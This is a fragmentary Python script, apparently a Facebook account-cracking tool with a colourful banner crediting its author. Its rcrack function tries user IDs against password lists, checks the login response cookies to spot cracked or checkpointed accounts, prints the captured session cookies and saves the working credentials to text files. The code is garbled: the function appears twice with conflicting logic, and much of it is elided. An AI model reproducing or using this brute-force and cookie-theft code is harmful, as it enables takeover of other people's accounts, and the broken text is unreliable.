...
\033[1;32m(•)==============================================🥀
\033[1;32m[🇮🇳] \033[1;33mCREATED BY   :  \033[1;33mAHMED(SHAR)
\033[1;32m[🇮🇳] \033[1;34mON FACEBOK   :  \033[1;34mprince king hu yawr 
\033[1;32m[🇮🇳] \033[1;35mON GITHUB    :  \033[1;35m***PRIVATE 
\033[1;32m[🇮🇳] \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE
\033[1;32m[🇮🇳] \033[1;36mBEST FRIEND  :  \033[1;36mSOHAIL GAFOOR SHAR☝️😍
\033[1;32m(•)==============================================💔\n\n"""  
loop = 0
oks = []
cps = []
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': pro,}
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[7:22]
				print('\033[1;92m[AHMED-OK] '+uid+' | '+ps+'\033[0;97m')
				print(f"\033[1;33mCOOKIE : \033[1;37m{coki}")
				open('AHMED-ok.txt', 'a').write(uid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\n\033[1;91m[AHMED-CP] '+uid+' | '+ps+'\033[0;97m')
				...
				continue
		loop+=1
		sys.stdout.write(f'\r\033[m[AHMED] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
		sys.stdout.flush()
	except:
		pass
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': pro}
			...
			if 'c_user' in log_cookies:
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\033[1;91m[AHED-CP] '+uid+' | '+ps+'\033[0;97m')
				#print(f"\n\033[1;33mCOOKIE : \033[1;37m{coki}")
				open('cp.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
				...
				continue
		loop+=1
		sys.stdout.write('\r[\033[1;92mAHMED\033[1;97m] [%s/%s]>[\033[1;32mOK\033[1;97m:-\033[1;92m%s\033[1;97m]-[CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
menu() 
